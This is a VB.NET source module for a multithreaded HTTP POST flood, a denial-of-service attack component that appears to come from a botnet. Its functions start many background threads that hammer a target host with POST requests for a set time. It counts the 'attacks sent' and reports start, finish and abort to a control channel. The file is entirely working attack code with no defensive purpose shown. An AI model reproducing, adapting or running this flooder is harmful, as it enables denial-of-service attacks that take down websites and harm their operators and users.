Imports System.Collections.Generic
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net
Imports System.Diagnostics
Public Module PostHTTP

    Private ThreadsEnded = 0
    Private PostDATA As String
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Public Sub StartPOSTHTTP(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            PostDATA = data
            ThreadstoUse = Threadsto
            TimetoAttack = Time
            Threads = New Thread(Threadsto - 1) {}
            TalktoChannel("HTTP POST Attack on " & HostToAttack & " started!", "")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            TalktoChannel("A HTTP POST Attack is Already Running on " & HostToAttack, "")
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            TalktoChannel("HTTP POST Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString, "")
            attacks = 0
        End If

    End Sub

    Public Sub StopPOSTHTTP()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            TalktoChannel("HTTP POST Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & attacks.ToString, "")
            attacks = 0

        Else
            TalktoChannel("No HTTP POST Attack is Running!", "")
        End If
    End Sub

    Private Sub DoWork()
        Try
            Dim lol As New System.Net.WebClient()
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    lol.UploadString(HostToAttack, PostDATA)
                    attacks = attacks + 1
                    lol.Dispose()
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
